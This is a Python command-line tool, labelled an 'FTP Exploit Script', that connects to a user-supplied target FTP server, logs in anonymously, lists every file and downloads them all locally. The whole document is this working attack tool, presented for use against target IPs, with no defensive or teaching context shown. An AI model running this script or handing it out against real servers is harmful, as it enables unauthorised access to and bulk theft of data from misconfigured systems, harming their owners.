import ftplib
import argparse
import os
from termcolor import colored

def connect_ftp(host, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login('anonymous', 'anonymous')
        print(colored(f"[+] FTP connection successful!", "green"))
        return ftp
    except Exception as e:
        print(colored(f"[-] Error connecting to FTP: {e}", "red"))
        return None

def list_files(ftp):
    try:
        files = ftp.nlst()
        print(colored(f"[+] Searching for files on FTP!", "green"))
        for file in files:
            print(file)
        return files
    except ftplib.error_perm as e:
        print(colored(f"[-] Error searching for files on FTP: {e}", "red"))
        return []

def download_files(ftp, files):
    for file in files:
        local_filename = os.path.join(os.getcwd(), file)
        with open(local_filename, 'wb') as f:
            def callback(data):
                f.write(data)
            print(colored(f"Downloading {file}...", "green"))
            try:
                ftp.retrbinary(f"RETR {file}", callback)
                print(colored(f"[+] File {file} downloaded successfully!", "green"))
            except ftplib.error_perm as e:
                print(colored(f"[-] Error downloading file {file}: {e}", "red"))

def main():
    parser = argparse.ArgumentParser(description="FTP Exploit Script")
    parser.add_argument('-ip', required=True, help='Target FTP server IP address')
    parser.add_argument('-port', type=int, default=21, help='Target FTP server port (default: 21)')
    args = parser.parse_args()
    
    print(colored(f"[...] Trying to connect to FTP...", "yellow"))
    ftp = connect_ftp(args.ip, args.port)
    if ftp:
        files = list_files(ftp)
        if files:
            download_files(ftp, files)
        ftp.quit()
        print(colored(f"[+] Operation successful!", "green"))
    else:
        print(colored(f"[-] Operation encountered errors!", "red"))

if __name__ == "__main__":
    main()
